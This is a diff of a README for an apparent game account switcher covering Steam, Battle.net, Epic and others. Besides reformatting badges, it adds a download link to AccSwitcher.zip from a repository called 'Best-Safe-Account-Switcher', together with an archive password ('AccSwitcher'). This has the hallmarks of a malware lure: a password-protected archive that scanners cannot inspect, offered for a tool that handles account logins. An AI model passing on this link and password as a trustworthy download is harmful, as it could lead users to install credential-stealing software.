@@ -20,17 +20,26 @@
     <img alt="Ko-Fi" src="https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white"></a>
 </p> 
 
-<p align="center"><a target="_blank" href="https://github.com/Fortiselec/Best-Safe-Account-Switcher/releases/download/latest/AccSwitcher.zip">
-  <img alt="Download latest" src="https://github.com/user-attachments/assets/53c8653d-7efe-4d5e-9089-d96c034bc985" height=70"></a>
-  123
+<p align="center">
+  <a target="_blank" href="https://github.com/Fortiselec/Best-Safe-Account-Switcher/releases/download/latest/AccSwitcher.zip">
+    <img alt="Download latest" src="https://github.com/user-attachments/assets/53c8653d-7efe-4d5e-9089-d96c034bc985" height="70">
+  </a>
+</p>
+<p align="center">Password: AccSwitcher </p>
+<p align="center">
   <a target="_blank" href="https://github.com/user-attachments/assets/600d7fba-63d0-40f6-8a55-3069bf6df403">
-  <img alt="More info" src="https://github.com/user-attachments/assets/600d7fba-63d0-40f6-8a55-3069bf6df403" height=70"></a>
+    <img alt="More info" src="https://github.com/user-attachments/assets/600d7fba-63d0-40f6-8a55-3069bf6df403" height="70">
+  </a>
 </p>
-<p align="center"><a target="_blank" href="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6">
-  <img alt="Themes" src="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6" height=70"></a>
+<p align="center">
+  <a target="_blank" href="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6">
+    <img alt="Themes" src="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6" height="70">
+  </a>
   <a target="_blank" href="https://github.com/user-attachments/assets/b69d7e0c-cf36-4a37-84d5-39708ddadc4f">
-  <img alt="Themes" src="https://github.com/user-attachments/assets/b69d7e0c-cf36-4a37-84d5-39708ddadc4f" height=70"></a>
+    <img alt="Themes" src="https://github.com/user-attachments/assets/b69d7e0c-cf36-4a37-84d5-39708ddadc4f" height="70">
+  </a>
 </p>
+
   
 **A Superfast open-source account switcher for Steam, Battle.net, Epic Games, Origin, Riot Games, Ubisoft, and more**.
 							     
